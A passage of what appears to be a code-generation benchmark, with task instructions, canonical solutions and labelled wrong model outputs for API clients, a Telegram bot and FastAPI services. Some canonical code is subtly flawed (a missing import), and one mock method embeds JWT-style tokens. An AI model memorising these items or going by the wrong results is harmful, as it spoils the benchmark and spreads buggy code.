    "wrong_result": "```python\nimport os\nimport requests\nfrom pathlib import Path\nfrom typing import Dict, Any, NoReturn\n\ndef download_schema_file(envs: Dict[str, Any]) -> Path | NoReturn:\n    schema_file = Path(envs.get(\"SIGMA_SCHEMA_FILE\", \"sigma-schema.json\"))\n    schema_url = envs[\"SIGMA_SCHEMA_URL\"]\n    workspace = Path(envs[\"GITHUB_WORKSPACE\"])\n\n    schema_file = workspace / schema_file\n\n    if schema_file.exists():\n        print(f\"Schema file already exists at {schema_file}\")\n        return schema_file\n\n    try:\n        response = requests.get(schema_url)\n        response.raise_for_status()\n        schema_file.parent.mkdir(parents=True, exist_ok=True)\n        with schema_file.open(\"wb\") as f:\n            f.write(response.content)\n        print(f\"Schema file downloaded to {schema_file}\")\n        return schema_file\n    except requests.RequestException as e:\n        print(f\"Failed to download schema file from {schema_url}: {e}\")\n        exit(-1)\n```"
  },
  {
    "Task_id": 116,
    "Instruction": "Task Description: Create a Python class that interacts with a web API to submit crawling tasks and retrieve their results, supporting both asynchronous and synchronous operations.\n\nClass Description: The Crawl4AiTester class provides functionality to interact with a web API for submitting URL crawling tasks. It handles authentication, task submission, and result retrieval with both asynchronous (polling) and synchronous approaches.\n\nAttributes:\n- base_url: str - The base URL of the API server (default: \"http://localhost:11235\")\n- api_token: str - The authentication token for API access (can be set via environment variable)\n- headers: dict - HTTP headers including the authorization token if provided\n\nMethods:\n- __init__(base_url: str = \"http://localhost:11235\", api_token: str = None) -> None - Initializes the API client with optional base URL and API token\n- submit_and_wait(request_data: Dict[str, Any], timeout: int = 300) -> Dict[str, Any] - Submits an asynchronous crawling task and polls for results until completion or timeout\n- submit_sync(request_data: Dict[str, Any]) -> Dict[str, Any] - Submits a synchronous crawling task and returns the immediate response",
    "Canonical_solution": "import requests\nimport os\nfrom typing import Dict, Any\n\nclass Crawl4AiTester:\n    def __init__(self, base_url: str = \"http://localhost:11235\", api_token: str = None):\n        self.base_url = base_url\n        self.api_token = api_token or os.getenv('CRAWL4AI_API_TOKEN')\n        self.headers = {'Authorization': f'Bearer {self.api_token}'} if self.api_token else {}\n        \n    def submit_and_wait(self, request_data: Dict[str, Any], timeout: int = 300) -> Dict[str, Any]:\n        response = requests.post(f\"{self.base_url}/crawl\", json=request_data, headers=self.headers)\n        if response.status_code == 403:\n            raise Exception(\"API token is invalid or missing\")\n        task_id = response.json()[\"task_id\"]\n        \n        start_time = time.time()\n        while True:\n            if time.time() - start_time > timeout:\n                raise TimeoutError(f\"Task {task_id} did not complete within {timeout} seconds\")\n                \n            result = requests.get(f\"{self.base_url}/task/{task_id}\", headers=self.headers)\n            status = result.json()\n            \n            if status[\"status\"] == \"failed\":\n                raise Exception(f\"Task failed: {status.get('error')}\")\n                \n            if status[\"status\"] == \"completed\":\n                return status\n                \n            time.sleep(2)\n            \n    def submit_sync(self, request_data: Dict[str, Any]) -> Dict[str, Any]:\n        response = requests.post(f\"{self.base_url}/crawl_sync\", json=request_data, headers=self.headers, timeout=60)\n        if response.status_code == 408:\n            raise TimeoutError(\"Task did not complete within server timeout\")\n        response.raise_for_status()\n        return response.json()",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport os\nimport time\nimport requests\nfrom typing import Dict, Any\n\nclass Crawl4AiTester:\n    def __init__(self, base_url: str = \"http://localhost:11235\", api_token: str = None) -> None:\n        self.base_url = base_url\n        self.api_token = api_token or os.getenv(\"API_TOKEN\")\n        self.headers = {\"Authorization\": f\"Bearer {self.api_token}\"} if self.api_token else {}\n\n    def submit_and_wait(self, request_data: Dict[str, Any], timeout: int = 300) -> Dict[str, Any]:\n        response = requests.post(f\"{self.base_url}/api/v1/crawl\", json=request_data, headers=self.headers)\n        response.raise_for_status()\n        task_id = response.json()[\"id\"]\n        start_time = time.time()\n        while True:\n            time.sleep(1)\n            response = requests.get(f\"{self.base_url}/api/v1/crawl/{task_id}\", headers=self.headers)\n            response.raise_for_status()\n            result = response.json()\n            if result[\"status\"] == \"completed\":\n                return result\n            if time.time() - start_time > timeout:\n                raise TimeoutError(\"Crawling task did not complete within the timeout period.\")\n\n    def submit_sync(self, request_data: Dict[str, Any]) -> Dict[str, Any]:\n        response = requests.post(f\"{self.base_url}/api/v1/crawl/sync\", json=request_data, headers=self.headers)\n        response.raise_for_status()\n        return response.json()\n```"
  },
  {
    "Task_id": 117,
    "Instruction": "Task Description: Implement a Python class that serves as a client for interacting with the Telegram Bot API, enabling message and file sending functionality.\n\nClass Description: The TelegramClient class provides methods to send messages and files to a specified Telegram chat using the Telegram Bot API. It handles HTTP requests and responses, including error logging.\n\nAttributes:\n- chat_id: [Union[int, str]] - The unique identifier for the target chat or username of the target channel (in format @channelusername)\n- thread_id: [int] - The unique identifier for the target message thread (topic) in a forum-style chat\n- bot_token: [str] - The authentication token for the Telegram bot\n\nMethods:\n- send_message(message: str, disable_links_preview: bool = True) -> None - Sends a text message to the specified chat. Uses Markdown formatting by default and can disable web page previews.\n  Input:\n    - message: [str] - The text message to be sent\n    - disable_links_preview: [bool] - Whether to disable web page previews for links in the message (default: True)\n  Output: None (logs errors if request fails)\n\n- send_file(file_name: str, contents: bytes) -> None - Sends a file to the specified chat, automatically handling different file types (photos vs documents) and converting SVG to PNG if needed.\n  Input:\n    - file_name: [str] - The name of the file to be sent\n    - contents: [bytes] - The binary content of the file\n  Output: None (logs errors if request fails)",
    "Canonical_solution": "import logging\nimport os\nfrom typing import Union\nimport requests\n\nTELEGRAM_BASE_URL = os.environ.get(\"TELEGRAM_BASE_URL\", \"https://api.telegram.org\")\n\nclass TelegramClient:\n    def __init__(self, chat_id: Union[int, str], thread_id: int, bot_token: str):\n        self.chat_id = int(chat_id)\n        self.thread_id = thread_id\n        self.bot_token = bot_token\n\n    def send_message(self, message: str, disable_links_preview: bool = True):\n        url = f\"{TELEGRAM_BASE_URL}/bot{self.bot_token}/sendMessage\"\n        message_json = {\n            \"chat_id\": self.chat_id,\n            \"message_thread_id\": self.thread_id,\n            \"disable_web_page_preview\": disable_links_preview,\n            \"parse_mode\": \"Markdown\",\n            \"text\": message,\n        }\n        response = requests.post(url, json=message_json)\n\n        if response.status_code != 200:\n            logging.error(\n                f\"Failed to send telegram message: chat_id - {self.chat_id} reason - {response.reason} {response.text}\"\n            )\n\n    def send_file(self, file_name: str, contents: bytes):\n        file_type = \"Photo\" if is_image(file_name) else \"Document\"\n        url = f\"{TELEGRAM_BASE_URL}/bot{self.bot_token}/send{file_type}?chat_id={self.chat_id}\"\n        if file_name.endswith(SVG_SUFFIX):\n            contents = convert_svg_to_png(contents)\n            file_name = file_name.replace(SVG_SUFFIX, PNG_SUFFIX)\n\n        files = {file_type.lower(): (file_name, contents)}\n        response = requests.post(url, files=files)\n\n        if response.status_code != 200:\n            logging.error(\n                f\"Failed to send telegram file: chat_id - {self.chat_id} reason - {response.reason} {response.text}\"\n            )",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\nfrom typing import Union\n\nclass TelegramClient:\n    def __init__(self, chat_id: Union[int, str], thread_id: int = None, bot_token: str = None):\n        self.chat_id = chat_id\n        self.thread_id = thread_id\n        self.bot_token = bot_token\n\n    def send_message(self, message: str, disable_links_preview: bool = True) -> None:\n        url = f\"https://api.telegram.org/bot{self.bot_token}/sendMessage\"\n        params = {\n            \"chat_id\": self.chat_id,\n            \"text\": message,\n            \"parse_mode\": \"Markdown\",\n            \"disable_web_page_preview\": disable_links_preview\n        }\n        if self.thread_id:\n            params[\"message_thread_id\"] = self.thread_id\n        try:\n            response = requests.post(url, params=params)\n            response.raise_for_status()\n        except requests.exceptions.RequestException as e:\n            print(f\"Error sending message: {e}\")\n\n    def send_file(self, file_name: str, contents: bytes) -> None:\n        url = f\"https://api.telegram.org/bot{self.bot_token}/sendDocument\"\n        files = {\"document\": (file_name, contents)}\n        params = {\n            \"chat_id\": self.chat_id\n        }\n        if self.thread_id:\n            params[\"message_thread_id\"] = self.thread_id\n        try:\n            response = requests.post(url, params=params, files=files)\n            response.raise_for_status()\n        except requests.exceptions.RequestException as e:\n            print(f\"Error sending file: {e}\")\n```\n"
  },
  {
    "Task_id": 119,
    "Instruction": "Task Description: Create a Python class that serves as a base HTTP client for interacting with a RESTful API, handling various types of API calls (GET, POST, PUT, DELETE) with proper error handling and logging.\n\nClass Description: SXTBaseAPI is a base class that provides HTTP client functionality for making API calls to a specified endpoint. It handles authentication, request construction, response processing, and error handling. The class supports configurable API versions, network call simulation, and comprehensive logging.\n\nAttributes:\n- api_url: str - Base URL for the API endpoint (default: 'https://api.spaceandtime.app')\n- access_token: str - Authentication token for API access\n- logger: logging.Logger - Logger instance for recording API call information\n- network_calls_enabled: bool - Flag to enable/disable actual network calls (default: True)\n- standard_headers: dict - Default headers for API requests\n- versions: dict - Dictionary mapping API endpoints to their versions\n- APICALLTYPE: Enum - Reference to SXTApiCallTypes enum for request types\n\nMethods:\n- __init__(access_token: str = '', logger: logging.Logger = None) -> None - Initializes the API client with optional access token and logger\n- call_api(endpoint: str, auth_header: bool = True, request_type: str = SXTApiCallTypes.POST, header_parms: dict = {}, data_parms: dict = {}, query_parms: dict = {}, path_parms: dict = {}) -> tuple[bool, dict] - Makes an API call with specified parameters and returns success status with response data\n- __fakedata__(endpoint: str) -> Union[list, dict] - Generates mock data when network calls are disabled (for testing purposes)",
    "Canonical_solution": "import requests\nimport json\nimport logging\nfrom pathlib import Path\nfrom .sxtenums import SXTApiCallTypes\nfrom .sxtexceptions import SxTArgumentError, SxTAPINotDefinedError\nfrom .sxtbiscuits import SXTBiscuit\n\nclass SXTBaseAPI:\n    api_url = 'https://api.spaceandtime.app'\n    access_token = ''\n    logger: logging.Logger\n    network_calls_enabled: bool = True\n    standard_headers = {\n        \"accept\": \"application/json\",\n        \"content-type\": \"application/json\"\n    }\n    versions = {}\n    APICALLTYPE = SXTApiCallTypes\n\n    def __init__(self, access_token: str = '', logger: logging.Logger = None) -> None:\n        if logger:\n            self.logger = logger\n        else:\n            self.logger = logging.getLogger()\n            self.logger.setLevel(logging.INFO)\n            if len(self.logger.handlers) == 0:\n                self.logger.addHandler(logging.StreamHandler())\n\n        apiversionfile = Path(Path(__file__).resolve().parent / 'apiversions.json')\n        self.access_token = access_token\n        with open(apiversionfile, 'r') as fh:\n            content = fh.read()\n        self.versions = json.loads(content)\n\n    def call_api(self, endpoint: str,\n                 auth_header: bool = True,\n                 request_type: str = SXTApiCallTypes.POST,\n                 header_parms: dict = {},\n                 data_parms: dict = {},\n                 query_parms: dict = {},\n                 path_parms: dict = {}):\n        txt = 'response.text not available - are you sure you have the correct API Endpoint?'\n        statuscode = 555\n        response = {}\n\n        if not self.network_calls_enabled: return True, self.__fakedata__(endpoint)\n\n        def __handle_errors__(txt, ex, statuscode, responseobject, loggerobject):\n            loggerobject.error(txt)\n            rtn = {'text': txt}\n            rtn['error'] = str(ex)\n            rtn['status_code'] = statuscode\n            rtn['response_object'] = responseobject\n            return False, rtn\n\n        try:\n            if endpoint not in self.versions.keys():\n                raise SxTAPINotDefinedError(\"Endpoint not defined in API Lookup (apiversions.json). Please reach out to Space and Time for assistance. \\nAs a work-around, you can try manually adding the endpoint to the SXTBaseAPI.versions dictionary.\")\n            version = self.versions[endpoint]\n            self.logger.debug(f'API Call started for endpoint: {version}/{endpoint}')\n\n            if request_type not in SXTApiCallTypes:\n                msg = f'request_type must be of type SXTApiCallTypes, not { type(request_type) }'\n                raise SxTArgumentError(msg, logger=self.logger)\n\n            for name, value in path_parms.items():\n                endpoint = endpoint.replace(f'{{{name}}}', value)\n\n            if query_parms != {}:\n                endpoint = f'{endpoint}?' + '&'.join([f'{n}={v}' for n, v in query_parms.items()])\n\n            headers = {k: v for k, v in self.standard_headers.items()}\n            if auth_header: headers['authorization'] = f'Bearer {self.access_token}'\n            headers.update(header_parms)\n\n            url = f'{self.api_url}/{version}/{endpoint}'\n\n            match request_type:\n                case SXTApiCallTypes.POST: callfunc = requests.post\n                case SXTApiCallTypes.GET: callfunc = requests.get\n                case SXTApiCallTypes.PUT: callfunc = requests.put\n                case SXTApiCallTypes.DELETE: callfunc = requests.delete\n                case _: raise SxTArgumentError('Call type must be SXTApiCallTypes enum.', logger=self.logger)\n\n            response = callfunc(url=url, data=json.dumps(data_parms), headers=headers)\n            txt = response.text\n            statuscode = response.status_code\n            response.raise_for_status()\n\n            try:\n                self.logger.debug('API return content type: ' + response.headers.get('content-type', ''))\n                rtn = response.json()\n            except json.decoder.JSONDecodeError as ex:\n                rtn = {'text': txt, 'status_code': statuscode}\n\n            self.logger.debug(f'API call completed for endpoint: \"{endpoint}\" with result: {txt}')\n            return True, rtn\n\n        except requests.exceptions.RequestException as ex:\n            return __handle_errors__(txt, ex, statuscode, response, self.logger)\n        except SxTAPINotDefinedError as ex:\n            return __handle_errors__(txt, ex, statuscode, response, self.logger)\n        except Exception as ex:\n            return __handle_errors__(txt, ex, statuscode, response, self.logger)\n\n    def __fakedata__(self, endpoint: str):\n        if endpoint in ['sql', 'sql/dql']:\n            rtn = [{'id': '1', 'str': 'a', 'this_record': 'is a test'}]\n            rtn.append({'id': '2', 'str': 'b', 'this_record': 'is a test'})\n            rtn.append({'id': '3', 'str': 'c', 'this_record': 'is a test'})\n            return rtn\n        else:\n            return {'authCode': '469867d9660b67f8aa12b2',\n                    'accessToken': 'eyJ0eXBlIjoiYWNjZXNzIiwia2lkIjUxNDVkYmQtZGNmYi00ZjI4LTg3NzItZjVmNjNlMzcwM2JlIiwiYWxnIjoiRVMyNTYifQ.eyJpYXQiOjE2OTczOTM1MDIsIm5iZiI6MTY5NzM5MzUwMiwiZXhwIjoxNjk3Mzk1MDAyLCJ0eXBlIjoiYWNjZXNzIiwidXNlciI6InN0ZXBoZW4iLCJzdWJzY3JpcHRpb24iOiIzMWNiMGI0Yi0xMjZlLTRlM2MtYTdhMS1lNWRmNDc4YTBjMDUiLCJzZXNzaW9uIjoiMzNiNGRhMzYxZjZiNTM3MjZlYmYyNzU4Iiwic3NuX2V4cCI6MTY5NzQ3OTkwMjMxNSwiaXRlcmF0aW9uIjoiNDEwY2YyZTgyYWZlODdmNDRiMzE4NDFiIn0.kpvrG-ro13P1YeMF6sjLh8wn1rO3jpCVeTrzhDe16ZmJu4ik1amcYz9uQff_XQcwBDrpnCeD5ZZ9mHqb_basew',\n                    'refreshToken': 'eyJ0eXBlIjoicmVmcmVzaCIsImtpZCITQ1ZGJkLWRjZmItNGYyOC04NzcyLWY1ZjYzZTM3MDNiZSIsImFsZyI6IkVTMjU2In0.eyJpYXQiOjE2OTczOTM1MDIsIm5iZiI6MTY5NzM5MzUwMiwiZXhwIjoxNjk3Mzk1MzAyLCJ0eXBlIjoicmVmcmVzaCIsInVzZXIiOiJzdGVwaGVuIiwic3Vic2NyaXB0aW9uIjoiMzFjYjBiNGItMTI2ZS00ZTNjLWE3YTEtZTVkZjQ3OGEwYzA1Iiwic2Vzc2lvbiI6IjMzYjRkYTM2MWY2YjUzNzI2ZWJmMjc1OCIsInNzbl9leHAiOjE2OTc0Nzk5MDIzMTUsIml0ZXJhdGlvbiI6IjQxMGNmMmU4MmFmZTg3ZjQ0YjMxODQxYiJ9.3vVYpTGBjXIejlaacaZOh_59O9ETfbvTCWvldoi0ojyXTRkTmENVpQRbw7av7yMM2jA7SRdEPQGGjYmThCfk9w',\n                    'accessTokenExpires': 1973950023160,\n                    'refreshTokenExpires': 1973953023160}",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport logging\nimport requests\nfrom enum import Enum\nfrom typing import Union, Tuple, Dict, List\n\nclass SXTApiCallTypes(Enum):\n    GET = 'GET'\n    POST = 'POST'\n    PUT = 'PUT'\n    DELETE = 'DELETE'\n\nclass SXTBaseAPI:\n    def __init__(self, access_token: str = '', logger: logging.Logger = None):\n        self.api_url = 'https://api.spaceandtime.app'\n        self.access_token = access_token\n        self.logger = logger if logger else logging.getLogger(__name__)\n        self.network_calls_enabled = True\n        self.standard_headers = {'Content-Type': 'application/json'}\n        self.versions = {}\n        self.APICALLTYPE = SXTApiCallTypes\n\n    def call_api(self, endpoint: str, auth_header: bool = True, request_type: str = SXTApiCallTypes.POST, header_parms: dict = {}, data_parms: dict = {}, query_parms: dict = {}, path_parms: dict = {}) -> Tuple[bool, Dict]:\n        if not self.network_calls_enabled:\n            return True, self.__fakedata__(endpoint)\n\n        url = self.api_url + endpoint\n        headers = self.standard_headers.copy()\n        headers.update(header_parms)\n        if auth_header and self.access_token:\n            headers['Authorization'] = f'Bearer {self.access_token}'\n\n        try:\n            if request_type == SXTApiCallTypes.GET:\n                response = requests.get(url, headers=headers, params=query_parms)\n            elif request_type == SXTApiCallTypes.POST:\n                response = requests.post(url, headers=headers, json=data_parms, params=query_parms)\n            elif request_type == SXTApiCallTypes.PUT:\n                response = requests.put(url, headers=headers, json=data_parms, params=query_parms)\n            elif request_type == SXTApiCallTypes.DELETE:\n                response = requests.delete(url, headers=headers, params=query_parms)\n            else:\n                raise ValueError(f'Invalid request type: {request_type}')\n\n            response.raise_for_status()\n            self.logger.info(f'API call to {url} successful')\n            return True, response.json()\n        except requests.exceptions.RequestException as e:\n            self.logger.error(f'API call to {url} failed: {e}')\n            return False, {'error': str(e)}\n\n    def __fakedata__(self, endpoint: str) -> Union[List, Dict]:\n        # Mock data for testing purposes\n        if endpoint == '/users':\n            return [{'id': 1, 'name': 'John Doe'}, {'id': 2, 'name': 'Jane Doe'}]\n        elif endpoint == '/users/1':\n            return {'id': 1, 'name': 'John Doe'}\n        else:\n            return {}\n```\n"
  },
  {
    "Task_id": 123,
    "Instruction": "Task Description: Create a FastAPI-based HTTP server for handling image segmentation and processing requests using SAM (Segment Anything Model) and related models.\n\nClass Description: SamAPI is a class that encapsulates all the route handlers for a FastAPI application dealing with image segmentation tasks. It provides endpoints for model prediction, mask dilation, and various segmentation techniques.\n\nAttributes:\n- app: FastAPI - The FastAPI application instance that will handle HTTP requests\n\nMethods:\n- __init__(app: FastAPI) -> None - Initializes the SamAPI class with a FastAPI instance and sets up routes\n- _setup_routes() -> None - Private method that defines all API endpoints and their handlers\n\nRoute Handlers (methods defined within _setup_routes):\n- heartbeat() -> Dict - Simple health check endpoint\n- api_sam_model() -> List[str] - Returns available SAM models\n- api_sam_predict(payload: SamPredictRequest) -> Any - Handles SAM model prediction requests\n- api_dino_predict(payload: DINOPredictRequest) -> Any - Handles DINO model prediction requests\n- api_dilate_mask(payload: DilateMaskRequest) -> Any - Handles mask dilation requests\n- api_controlnet_seg(payload: ControlNetSegRequest, autosam_conf: AutoSAMConfig) -> Any - Handles ControlNet segmentation requests\n- api_category_mask(payload: CategoryMaskRequest, autosam_conf: AutoSAMConfig) -> Any - Handles category-specific mask generation requests\n\nSupporting Models (Pydantic BaseModel classes):\n- SamPredictRequest - Request model for SAM predictions\n- DINOPredictRequest - Request model for DINO predictions\n- DilateMaskRequest - Request model for mask dilation\n- AutoSAMConfig - Configuration model for AutoSAM parameters\n- ControlNetSegRequest - Request model for ControlNet segmentation\n- CategoryMaskRequest - Request model for category-specific masking",
    "Canonical_solution": "from fastapi import FastAPI, Body\nfrom pydantic import BaseModel\nfrom typing import Any, Optional, List\nfrom PIL import Image\nimport numpy as np\nimport os\n\nclass SamAPI:\n    def __init__(self, app: FastAPI):\n        self.app = app\n        self._setup_routes()\n\n    class SamPredictRequest(BaseModel):\n        sam_model_name: str = \"sam_vit_h_4b8939.pth\"\n        input_image: str\n        sam_positive_points: List[List[float]] = []\n        sam_negative_points: List[List[float]] = []\n        dino_enabled: bool = False\n        dino_model_name: Optional[str] = \"GroundingDINO_SwinT_OGC (694MB)\"\n        dino_text_prompt: Optional[str] = None\n        dino_box_threshold: Optional[float] = 0.3\n        dino_preview_checkbox: bool = False\n        dino_preview_boxes_selection: Optional[List[int]] = None\n\n    class DINOPredictRequest(BaseModel):\n        input_image: str\n        dino_model_name: str = \"GroundingDINO_SwinT_OGC (694MB)\"\n        text_prompt: str\n        box_threshold: float = 0.3\n\n    class DilateMaskRequest(BaseModel):\n        input_image: str\n        mask: str\n        dilate_amount: int = 10\n\n    class AutoSAMConfig(BaseModel):\n        points_per_side: Optional[int] = 32\n        points_per_batch: int = 64\n        pred_iou_thresh: float = 0.88\n        stability_score_thresh: float = 0.95\n        stability_score_offset: float = 1.0\n        box_nms_thresh: float = 0.7\n        crop_n_layers: int = 0\n        crop_nms_thresh: float = 0.7\n        crop_overlap_ratio: float = 512 / 1500\n        crop_n_points_downscale_factor: int = 1\n        min_mask_region_area: int = 0\n\n    class ControlNetSegRequest(BaseModel):\n        sam_model_name: str = \"sam_vit_h_4b8939.pth\"\n        input_image: str\n        processor: str = \"seg_ofade20k\"\n        processor_res: int = 512\n        pixel_perfect: bool = False\n        resize_mode: Optional[int] = 1\n        target_W: Optional[int] = None\n        target_H: Optional[int] = None\n\n    class CategoryMaskRequest(BaseModel):\n        sam_model_name: str = \"sam_vit_h_4b8939.pth\"\n        processor: str = \"seg_ofade20k\"\n        processor_res: int = 512\n        pixel_perfect: bool = False\n        resize_mode: Optional[int] = 1\n        target_W: Optional[int] = None\n        target_H: Optional[int] = None\n        category: str\n        input_image: str\n\n    def _setup_routes(self):\n        @self.app.get(\"/sam/heartbeat\")\n        async def heartbeat():\n            return {\"msg\": \"Success!\"}\n\n        @self.app.get(\"/sam/sam-model\")\n        async def api_sam_model() -> List[str]:\n            return sam_model_list\n\n        @self.app.post(\"/sam/sam-predict\")\n        async def api_sam_predict(payload: SamPredictRequest = Body(...)) -> Any:\n            payload.input_image = decode_to_pil(payload.input_image).convert('RGBA')\n            sam_output_mask_gallery, sam_message = sam_predict(\n                payload.sam_model_name,\n                payload.input_image,\n                payload.sam_positive_points,\n                payload.sam_negative_points,\n                payload.dino_enabled,\n                payload.dino_model_name,\n                payload.dino_text_prompt,\n                payload.dino_box_threshold,\n                payload.dino_preview_checkbox,\n                payload.dino_preview_boxes_selection)\n            result = {\"msg\": sam_message}\n            if len(sam_output_mask_gallery) == 9:\n                result[\"blended_images\"] = list(map(encode_to_base64, sam_output_mask_gallery[:3]))\n                result[\"masks\"] = list(map(encode_to_base64, sam_output_mask_gallery[3:6]))\n                result[\"masked_images\"] = list(map(encode_to_base64, sam_output_mask_gallery[6:]))\n            return result\n\n        @self.app.post(\"/sam/dino-predict\")\n        async def api_dino_predict(payload: DINOPredictRequest = Body(...)) -> Any:\n            payload.input_image = decode_to_pil(payload.input_image)\n            dino_output_img, _, dino_msg = dino_predict(\n                payload.input_image,\n                payload.dino_model_name,\n                payload.text_prompt,\n                payload.box_threshold)\n            return {\n                \"msg\": dino_msg[\"value\"] if \"value\" in dino_msg else \"Done\",\n                \"image_with_box\": encode_to_base64(dino_output_img) if dino_output_img is not None else None,\n            }\n\n        @self.app.post(\"/sam/dilate-mask\")\n        async def api_dilate_mask(payload: DilateMaskRequest = Body(...)) -> Any:\n            payload.input_image = decode_to_pil(payload.input_image).convert(\"RGBA\")\n            payload.mask = decode_to_pil(payload.mask)\n            dilate_result = list(map(encode_to_base64, update_mask(payload.mask, 0, payload.dilate_amount, payload.input_image)))\n            return {\"blended_image\": dilate_result[0], \"mask\": dilate_result[1], \"masked_image\": dilate_result[2]}\n\n        @self.app.post(\"/sam/controlnet-seg\")\n        async def api_controlnet_seg(payload: ControlNetSegRequest = Body(...),\n                                    autosam_conf: AutoSAMConfig = Body(...)) -> Any:\n            payload.input_image = decode_to_pil(payload.input_image)\n            cnet_seg_img, cnet_seg_msg = cnet_seg(\n                payload.sam_model_name,\n                payload.input_image,\n                payload.processor,\n                payload.processor_res,\n                payload.pixel_perfect,\n                payload.resize_mode,\n                payload.target_W,\n                payload.target_H,\n                autosam_conf.points_per_side,\n                autosam_conf.points_per_batch,\n                autosam_conf.pred_iou_thresh,\n                autosam_conf.stability_score_thresh,\n                autosam_conf.stability_score_offset,\n                autosam_conf.box_nms_thresh,\n                autosam_conf.crop_n_layers,\n                autosam_conf.crop_nms_thresh,\n                autosam_conf.crop_overlap_ratio,\n                autosam_conf.crop_n_points_downscale_factor,\n                autosam_conf.min_mask_region_area)\n            cnet_seg_img = list(map(encode_to_base64, cnet_seg_img))\n            result = {\"msg\": cnet_seg_msg}\n            if len(cnet_seg_img) == 3:\n                result[\"blended_images\"] = cnet_seg_img[0]\n                result[\"random_seg\"] = cnet_seg_img[1]\n                result[\"edit_anything_control\"] = cnet_seg_img[2]\n            elif len(cnet_seg_img) == 4:\n                result[\"sem_presam\"] = cnet_seg_img[0]\n                result[\"sem_postsam\"] = cnet_seg_img[1]\n                result[\"blended_presam\"] = cnet_seg_img[2]\n                result[\"blended_postsam\"] = cnet_seg_img[3]\n            return result\n\n        @self.app.post(\"/sam/category-mask\")\n        async def api_category_mask(payload: CategoryMaskRequest = Body(...),\n                                  autosam_conf: AutoSAMConfig = Body(...)) -> Any:\n            payload.input_image = decode_to_pil(payload.input_image)\n            category_mask_img, category_mask_msg, resized_input_img = categorical_mask(\n                payload.sam_model_name,\n                payload.processor,\n                payload.processor_res,\n                payload.pixel_perfect,\n                payload.resize_mode,\n                payload.target_W,\n                payload.target_H,\n                payload.category,\n                payload.input_image,\n                autosam_conf.points_per_side,\n                autosam_conf.points_per_batch,\n                autosam_conf.pred_iou_thresh,\n                autosam_conf.stability_score_thresh,\n                autosam_conf.stability_score_offset,\n                autosam_conf.box_nms_thresh,\n                autosam_conf.crop_n_layers,\n                autosam_conf.crop_nms_thresh,\n                autosam_conf.crop_overlap_ratio,\n                autosam_conf.crop_n_points_downscale_factor,\n                autosam_conf.min_mask_region_area)\n            category_mask_img = list(map(encode_to_base64, category_mask_img))\n            result = {\"msg\": category_mask_msg}\n            if len(category_mask_img) == 3:\n                result[\"blended_image\"] = category_mask_img[0]\n                result[\"mask\"] = category_mask_img[1]\n                result[\"masked_image\"] = category_mask_img[2]\n            if resized_input_img is not None:\n                result[\"resized_input\"] = encode_to_base64(resized_input_img)\n            return result",
    "Code_level": "Class-level",
    "FSMID_for_test": 61,
    "wrong_result": "```python\nfrom fastapi import FastAPI\nfrom pydantic import BaseModel\nfrom typing import List, Dict, Any\n\nclass SamAPI:\n    def __init__(self, app: FastAPI) -> None:\n        self.app = app\n        self._setup_routes()\n\n    def _setup_routes(self) -> None:\n        @self.app.get(\"/heartbeat\")\n        async def heartbeat() -> Dict:\n            return {\"status\": \"OK\"}\n\n        @self.app.get(\"/api/sam_model\")\n        async def api_sam_model() -> List[str]:\n            return [\"model1\", \"model2\"]\n\n        @self.app.post(\"/api/sam_predict\")\n        async def api_sam_predict(payload: SamPredictRequest) -> Any:\n            # Handle SAM model prediction\n            pass\n\n        @self.app.post(\"/api/dino_predict\")\n        async def api_dino_predict(payload: DINOPredictRequest) -> Any:\n            # Handle DINO model prediction\n            pass\n\n        @self.app.post(\"/api/dilate_mask\")\n        async def api_dilate_mask(payload: DilateMaskRequest) -> Any:\n            # Handle mask dilation\n            pass\n\n        @self.app.post(\"/api/controlnet_seg\")\n        async def api_controlnet_seg(payload: ControlNetSegRequest, autosam_conf: AutoSAMConfig) -> Any:\n            # Handle ControlNet segmentation\n            pass\n\n        @self.app.post(\"/api/category_mask\")\n        async def api_category_mask(payload: CategoryMaskRequest, autosam_conf: AutoSAMConfig) -> Any:\n            # Handle category-specific masking\n            pass\n\nclass SamPredictRequest(BaseModel):\n    # Define request model for SAM predictions\n    pass\n\nclass DINOPredictRequest(BaseModel):\n    # Define request model for DINO predictions\n    pass\n\nclass DilateMaskRequest(BaseModel):\n    # Define request model for mask dilation\n    pass\n\nclass AutoSAMConfig(BaseModel):\n    # Define configuration model for AutoSAM parameters\n    pass\n\nclass ControlNetSegRequest(BaseModel):\n    # Define request model for ControlNet segmentation\n    pass\n\nclass CategoryMaskRequest(BaseModel):\n    # Define request model for category-specific masking\n    pass\n```"
  },
  {
    "Task_id": 124,
    "Instruction": "Task Description: Create a FastAPI-based service for extracting and citing facts from a given context in response to a user query, using OpenAI's language model for processing and providing streaming responses.\n\nClass Description: ExtractionService is a FastAPI application that handles question-answering with citation extraction. It processes user queries against provided context, extracts facts with proper citations, and streams the results back to the client.\n\nAttributes:\napp: FastAPI - The FastAPI application instance that handles HTTP requests and routes\nclient: OpenAI - The OpenAI client configured for structured output using the instructor library\n\nMethods:\n__init__: () -> None - Initializes the FastAPI application and sets up routes\n_setup_routes: () -> None - Configures the API endpoints and their handlers\nextract: (question: Question, openai_key: str) -> StreamingResponse - The endpoint handler that processes extraction requests and returns streaming responses\nstream_extract: (question: Question) -> Iterable[Fact] - Performs the actual extraction using OpenAI's API and yields facts\nget_api_key: (request: Request) -> str - Retrieves the OpenAI API key from either environment variables or request headers",
    "Canonical_solution": "from fastapi import FastAPI, Request, HTTPException, Depends\nfrom fastapi.params import Depends\nfrom pydantic import BaseModel, Field\nfrom starlette.responses import StreamingResponse\nfrom collections.abc import Iterable\nimport json\nimport os\nimport logging\nfrom instructor import OpenAISchema\nfrom instructor.dsl.multitask import MultiTaskBase\nfrom openai import OpenAI\nimport instructor\n\nclient = instructor.from_openai(OpenAI())\nlogger = logging.getLogger(__name__)\n\nclass Fact(BaseModel):\n    fact: str = Field(\n        ...,\n        description=\"Body of the sentences, as part of a response, it should read like a sentence that answers the question\",\n    )\n    substring_quotes: list[str] = Field(\n        ...,\n        description=\"Each source should be a direct quote from the context, as a substring of the original content\",\n    )\n\n    def _get_span(self, quote, context):\n        import regex\n        minor = quote\n        major = context\n        errs_ = 0\n        s = regex.search(f\"({minor}){{e<={errs_}}}\", major)\n        while s is None and errs_ <= len(context) * 0.05:\n            errs_ += 1\n            s = regex.search(f\"({minor}){{e<={errs_}}}\", major)\n        if s is not 